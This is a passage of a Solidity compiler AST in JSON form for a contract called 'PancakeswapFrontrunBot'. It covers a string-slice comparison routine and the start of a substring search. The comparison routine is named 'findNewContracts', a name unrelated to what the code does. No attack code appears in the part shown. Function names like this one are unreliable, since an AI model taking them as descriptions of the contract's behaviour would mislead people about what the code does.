																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														},
																														"id": 210,
																														"isConstant": false,
																														"isLValue": false,
																														"isPure": false,
																														"lValueRequested": false,
																														"leftExpression": {
																															"argumentTypes": null,
																															"hexValue": "38",
																															"id": 203,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": true,
																															"kind": "number",
																															"lValueRequested": false,
																															"nodeType": "Literal",
																															"src": "1993:1:3",
																															"subdenomination": null,
																															"typeDescriptions": {
																																"typeIdentifier": "t_rational_8_by_1",
																																"typeString": "int_const 8"
																															},
																															"value": "8"
																														},
																														"nodeType": "BinaryOperation",
																														"operator": "*",
																														"rightExpression": {
																															"argumentTypes": null,
																															"components": [
																																{
																																	"argumentTypes": null,
																																	"commonType": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	},
																																	"id": 208,
																																	"isConstant": false,
																																	"isLValue": false,
																																	"isPure": false,
																																	"lValueRequested": false,
																																	"leftExpression": {
																																		"argumentTypes": null,
																																		"commonType": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		},
																																		"id": 206,
																																		"isConstant": false,
																																		"isLValue": false,
																																		"isPure": false,
																																		"lValueRequested": false,
																																		"leftExpression": {
																																			"argumentTypes": null,
																																			"hexValue": "3332",
																																			"id": 204,
																																			"isConstant": false,
																																			"isLValue": false,
																																			"isPure": true,
																																			"kind": "number",
																																			"lValueRequested": false,
																																			"nodeType": "Literal",
																																			"src": "1998:2:3",
																																			"subdenomination": null,
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_rational_32_by_1",
																																				"typeString": "int_const 32"
																																			},
																																			"value": "32"
																																		},
																																		"nodeType": "BinaryOperation",
																																		"operator": "-",
																																		"rightExpression": {
																																			"argumentTypes": null,
																																			"id": 205,
																																			"name": "shortest",
																																			"nodeType": "Identifier",
																																			"overloadedDeclarations": [],
																																			"referencedDeclaration": 136,
																																			"src": "2003:8:3",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_uint256",
																																				"typeString": "uint256"
																																			}
																																		},
																																		"src": "1998:13:3",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"nodeType": "BinaryOperation",
																																	"operator": "+",
																																	"rightExpression": {
																																		"argumentTypes": null,
																																		"id": 207,
																																		"name": "idx",
																																		"nodeType": "Identifier",
																																		"overloadedDeclarations": [],
																																		"referencedDeclaration": 162,
																																		"src": "2014:3:3",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"src": "1998:19:3",
																																	"typeDescriptions": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	}
																																}
																															],
																															"id": 209,
																															"isConstant": false,
																															"isInlineArray": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"nodeType": "TupleExpression",
																															"src": "1997:21:3",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														},
																														"src": "1993:25:3",
																														"typeDescriptions": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														}
																													}
																												],
																												"id": 211,
																												"isConstant": false,
																												"isInlineArray": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"nodeType": "TupleExpression",
																												"src": "1992:27:3",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"src": "1987:32:3",
																											"typeDescriptions": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											}
																										},
																										"nodeType": "BinaryOperation",
																										"operator": "-",
																										"rightExpression": {
																											"argumentTypes": null,
																											"hexValue": "31",
																											"id": 213,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": true,
																											"kind": "number",
																											"lValueRequested": false,
																											"nodeType": "Literal",
																											"src": "2022:1:3",
																											"subdenomination": null,
																											"typeDescriptions": {
																												"typeIdentifier": "t_rational_1_by_1",
																												"typeString": "int_const 1"
																											},
																											"value": "1"
																										},
																										"src": "1987:36:3",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"id": 215,
																								"isConstant": false,
																								"isInlineArray": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"nodeType": "TupleExpression",
																								"src": "1986:38:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "1978:46:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 218,
																					"nodeType": "ExpressionStatement",
																					"src": "1978:46:3"
																				}
																			]
																		}
																	},
																	{
																		"assignments": [
																			222
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 222,
																				"mutability": "mutable",
																				"name": "diff",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 242,
																				"src": "2062:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 221,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2062:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 232,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 231,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 225,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 223,
																							"name": "a",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 173,
																							"src": "2078:1:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 224,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 191,
																							"src": "2082:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2078:8:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 226,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2077:10:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 229,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 227,
																							"name": "b",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 176,
																							"src": "2091:1:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 228,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 191,
																							"src": "2095:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2091:8:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 230,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2090:10:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2077:23:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2062:38:3"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 235,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 233,
																				"name": "diff",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 222,
																				"src": "2123:4:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 234,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2131:1:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2123:9:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 241,
																		"nodeType": "IfStatement",
																		"src": "2119:52:3",
																		"trueBody": {
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 238,
																						"name": "diff",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 222,
																						"src": "2166:4:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"id": 237,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "2162:3:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_int256_$",
																						"typeString": "type(int256)"
																					},
																					"typeName": {
																						"id": 236,
																						"name": "int",
																						"nodeType": "ElementaryTypeName",
																						"src": "2162:3:3",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 239,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "2162:9:3",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_int256",
																					"typeString": "int256"
																				}
																			},
																			"functionReturnParameters": 134,
																			"id": 240,
																			"nodeType": "Return",
																			"src": "2155:16:3"
																		}
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 246,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 244,
																	"name": "selfptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 152,
																	"src": "2201:7:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 245,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2212:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2201:13:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 247,
															"nodeType": "ExpressionStatement",
															"src": "2201:13:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 250,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 248,
																	"name": "otherptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 157,
																	"src": "2229:8:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 249,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2241:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2229:14:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 251,
															"nodeType": "ExpressionStatement",
															"src": "2229:14:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 167,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 165,
														"name": "idx",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 162,
														"src": "1377:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 166,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 136,
														"src": "1383:8:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1377:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 253,
												"initializationExpression": {
													"assignments": [
														162
													],
													"declarations": [
														{
															"constant": false,
															"id": 162,
															"mutability": "mutable",
															"name": "idx",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 253,
															"src": "1363:8:3",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 161,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "1363:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 164,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 163,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1374:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1363:12:3"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 170,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 168,
															"name": "idx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 162,
															"src": "1393:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 169,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1400:2:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "1393:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 171,
													"nodeType": "ExpressionStatement",
													"src": "1393:9:3"
												},
												"nodeType": "ForStatement",
												"src": "1358:897:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													},
													"id": 264,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 256,
																	"name": "self",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 128,
																	"src": "2276:4:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																		"typeString": "struct PancakeswapFrontrunBot.slice memory"
																	}
																},
																"id": 257,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 123,
																"src": "2276:9:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 255,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2272:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 254,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2272:3:3",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 258,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2272:14:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 261,
																	"name": "other",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 130,
																	"src": "2293:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																		"typeString": "struct PancakeswapFrontrunBot.slice memory"
																	}
																},
																"id": 262,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 123,
																"src": "2293:10:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 260,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2289:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 259,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2289:3:3",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 263,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2289:15:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"src": "2272:32:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"functionReturnParameters": 134,
												"id": 265,
												"nodeType": "Return",
												"src": "2265:39:3"
											}
										]
									},
									"documentation": null,
									"id": 267,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findNewContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 131,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 128,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 267,
												"src": "1090:17:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 127,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "1090:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 130,
												"mutability": "mutable",
												"name": "other",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 267,
												"src": "1109:18:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
													"typeString": "struct PancakeswapFrontrunBot.slice"
												},
												"typeName": {
													"contractScope": null,
													"id": 129,
													"name": "slice",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 126,
													"src": "1109:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_struct$_slice_$126_storage_ptr",
														"typeString": "struct PancakeswapFrontrunBot.slice"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1089:39:3"
									},
									"returnParameters": {
										"id": 134,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 133,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 267,
												"src": "1152:3:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 132,
													"name": "int",
													"nodeType": "ElementaryTypeName",
													"src": "1152:3:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1151:5:3"
									},
									"scope": 1724,
									"src": "1064:1248:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 388,
										"nodeType": "Block",
										"src": "2662:1309:3",
										"statements": [
											{
												"assignments": [
													281
												],
												"declarations": [
													{
														"constant": false,
														"id": 281,
														"mutability": "mutable",
														"name": "ptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 388,
														"src": "2673:8:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 280,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2673:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 283,
												"initialValue": {
													"argumentTypes": null,
													"id": 282,
													"name": "selfptr",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 271,
													"src": "2684:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2673:18:3"
											},
											{
												"assignments": [
													285
												],
												"declarations": [
													{
														"constant": false,
														"id": 285,
														"mutability": "mutable",
														"name": "idx",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 388,
														"src": "2702:8:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 284,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "2702:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 286,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "2702:8:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 289,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 287,
														"name": "needlelen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 273,
														"src": "2728:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 288,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 269,
														"src": "2741:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2728:20:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 383,
												"nodeType": "IfStatement",
												"src": "2724:1205:3",
												"trueBody": {
													"id": 382,
													"nodeType": "Block",
													"src": "2750:1179:3",
													"statements": [
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 292,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 290,
																	"name": "needlelen",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 273,
																	"src": "2769:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<=",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 291,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2782:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2769:15:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"id": 380,
																"nodeType": "Block",
																"src": "3439:479:3",
																"statements": [
																	{
																		"assignments": [
																			349
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 349,
																				"mutability": "mutable",
																				"name": "hash",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 380,
																				"src": "3508:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes32",
																					"typeString": "bytes32"
																				},
																				"typeName": {
																					"id": 348,
																					"name": "bytes32",
																					"nodeType": "ElementaryTypeName",
																					"src": "3508:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes32",
																						"typeString": "bytes32"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 350,
																		"initialValue": null,
																		"nodeType": "VariableDeclarationStatement",
																		"src": "3508:12:3"
																	},
																	{
																		"AST": {
																			"nodeType": "YulBlock",
																			"src": "3548:43:3",
																			"statements": [
																				{
																					"nodeType": "YulAssignment",
																					"src": "3550:39:3",
																					"value": {
																						"arguments": [
																							{
																								"name": "needleptr",
																								"nodeType": "YulIdentifier",
																								"src": "3568:9:3"
																							},
																							{
																								"name": "needlelen",
																								"nodeType": "YulIdentifier",
																								"src": "3579:9:3"
																							}
																						],
																						"functionName": {
																							"name": "keccak256",
																							"nodeType": "YulIdentifier",
																							"src": "3558:9:3"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "3558:31:3"
																					},
																					"variableNames": [
																						{
																							"name": "hash",
																							"nodeType": "YulIdentifier",
																							"src": "3550:4:3"
																						}
																					]
																				}
																			]
																		},
																		"evmVersion": "istanbul",
																		"externalReferences": [
																			{
																				"declaration": 349,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3550:4:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 273,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3579:9:3",
																				"valueSize": 1
																			},
																			{
																				"declaration": 275,
																				"isOffset": false,
																				"isSlot": false,
																				"src": "3568:9:3",
																				"valueSize": 1
																			}
																		],
																		"id": 351,
